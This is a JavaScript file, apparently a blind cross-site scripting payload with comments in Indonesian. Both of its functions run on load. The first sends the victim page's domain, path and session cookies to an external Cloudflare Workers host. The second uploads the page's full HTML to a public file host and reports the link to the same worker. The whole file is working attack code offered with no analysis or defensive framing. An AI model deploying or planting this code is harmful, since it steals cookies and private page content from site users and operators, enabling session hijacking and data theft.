function telegramSend() {
    var textData = 'XSS+Alert+in+' + document.domain + '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-%0d%0a<pre>' + document.location.hostname + document.location.pathname + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document.cookie + '</pre>';
    
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://memek-worker.defoy89122.workers.dev/?message=' + textData, true);
    xhr.send();
}
telegramSend();
async function sendPageSource() {
  try {
    // 1. Ambil HTML dan lokasi domain
    const htmlContent = document.documentElement.outerHTML;
    const currentUrl = window.location.href;

    // 2. Buat objek FormData untuk Uguu.se
    const formData = new FormData();
    const blob = new Blob([htmlContent], { type: 'text/html' });
    formData.append('files[]', blob, 'source.html');

    // 3. Upload file ke Uguu.se via JavaScript
    const uguuResponse = await fetch('https://uguu.se/upload', {
      method: 'POST',
      body: formData
    });
    
    const uguuData = await uguuResponse.json();
    const uploadedFileUrl = uguuData.files[0].url; // Mendapatkan link hasil upload

    // 4. Kirim link & info domain ke Cloudflare Worker
    await fetch('https://memek-worker.defoy89122.workers.dev/', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        file_url: uploadedFileUrl,
        page_url: currentUrl
      })
    });

    console.log('Berhasil terkirim!');
  } catch (error) {
    console.error('Terjadi kesalahan:', error);
  }
}

// Jalankan fungsi
sendPageSource();
